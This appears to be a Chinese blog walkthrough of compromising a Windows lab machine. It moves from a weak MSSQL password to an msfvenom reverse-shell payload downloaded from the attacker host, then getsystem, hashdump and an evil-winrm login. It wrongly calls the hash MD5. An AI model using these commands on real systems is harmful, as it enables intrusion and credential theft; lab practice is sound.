---
title: "EP-Web01"
date: 2024-11-12
categories: 
  - "engineering-practice"
tags: 
  - "windows"
  - "工程实践"
---

## 前言

该靶机是目标局域网内的入口机器，本文目的是拿到Web01的最高权限并且实现远程登录

## 信息收集

```
$ arp-scan -l
```

![](./images/image.png)

发现存在一台IP值为：`192.168.237.139`的主机

```
$ namp 192.168.237.139
```

![](./images/image-1.png)

简单扫描发现开放端口：`21`、`80`、`1433`，其中存在mssql服务

使用`Fscan`进行扫描：[Releases · shadow1ng/fscan (github.com)](https://github.com/shadow1ng/fscan/releases)

```
$ ./fscan -h 192.168.237.139
```

![](./images/image-2.png)

发现ftp服务存在匿名访问，不过没有任何泄露

mssql服务存在弱口令

## 反弹SHELL

下载mssql命令执行工具：[Release mssql-command-tools · Mayter/mssql-command-tool](https://github.com/Mayter/mssql-command-tool/releases/tag/mssql)

并且生成powershell的反弹命令：[](https://www.ddosi.org/shell/)[HYH的反弹Shell生成器](https://www.hyhforever.top/revshell/)

![](./images/image-4.png)

nc监听端口

![](./images/image-5.png)

并且执行命令

![](./images/image-6.png)

成功得到powershell的反弹

![](./images/image-7.png)

## 权限提升

当前用户权限为普通用户

![](./images/image-9.png)

生成msf反弹木马

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.237.140 LPORT=6666 -f exe -o reverse.exe
```

![](./images/image-10.png)

并且开放http服务，让目标机器下载

```
#kali
$ python -m http.server 80

#PS
PS: curl 192.168.237.140/reverse.exe -O shell.exe
```

![](./images/image-11.png)

![](./images/image-12.png)

再开一个终端，打开msfconsole

```
$ msfconsole
```

![](./images/image-13.png)

设置监听器handler，并配置

```
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.237.140
msf6 exploit(multi/handler) > set lport 6666
msf6 exploit(multi/handler) > run
```

![](./images/image-14.png)

回到powershell那里运行exe文件

![](./images/image-15.png)

可以看到成功进入meterpreter

![](./images/image-16.png)

执行getsystem进行权限提升，如下图可以看到提升到了system最高权限

```
meterpreter > getsystem
```

![](./images/image-17.png)

进入administrator的目录下，拿到flag

![](./images/28722b3af9b10102e1018c2c979d56d0.png)

## 获取密码

```
$meterpreter > hashdump
```

获取到用户密码hash值，这里只要Administrator的光标部分，是由md5进行加密的

![](./images/image-20.png)

将其放入解密网站：[MD5免费在线解密破解\_MD5在线加密-SOMD5](https://www.somd5.com/)

成功得到密码

![](./images/299bc4d4b342a0e58d367c2663e65851.png)

## 远程登录

由于在真实的渗透测试环境下是无法直接接触到目标机器的，所以要找到远程登录的办法

进行nmap全端口扫描

```
$ nmap 192.168.237.139 -p- 
```

![](./images/image-22.png)

发现存在5985端口，该端口用于Windows的远程管理

**evil-winrm是一个可用于黑客攻击/渗透测试的Windows远程管理(WinRM)Shell**

由于知道了管理员的密码可以直接登录

```
$ evil-winrm -i 192.168.237.139 -u Administrator -p 'xxxx'
```

![](./images/image-23.png)

登录成功
